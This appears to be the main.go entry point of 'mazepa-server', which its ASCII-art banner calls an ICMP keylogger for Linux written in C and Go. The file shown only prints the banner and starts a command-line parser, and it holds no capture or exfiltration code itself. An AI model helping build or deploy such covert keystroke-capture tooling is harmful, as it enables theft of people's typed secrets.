package main

import "mazepa-server/cli"

const SKID_ASCII_ART = `
                                  /   \
 _                        )      ((   ))     (
(@)                      /|\      ))_((     /|\
|-|                     / | \    (/\|/\)   / | \                      (@)
| | -------------------/--|-voV---\\'|'/--Vov-|--\--------------------|-|
|-|                         '^'   (o o)   '^'                         | |
| |                               '\Y/'                               |-|
|-|                                                                   | |
| |        MAZEPA => ICMP KEYLOGGER FOR LINUX WRITTEN IN C AND GO     |-|
|-|        v2.0                                            ~djnn      | |
| |                                                                   |-|
|_|___________________________________________________________________| |
(@)              l   /\ /         ( (       \ /\   l                 \|-|
                 l /   V           \ \       V   \ l                  (@)
                 l/                _) )_          \I
                                    \ /

`

func main() {

	/* mandatory at this stage lol */
	println(SKID_ASCII_ART)

	opts := cli.GetDefaultOptions()
	parser := cli.GetParser(&opts)

	parser.ExecuteC()

}
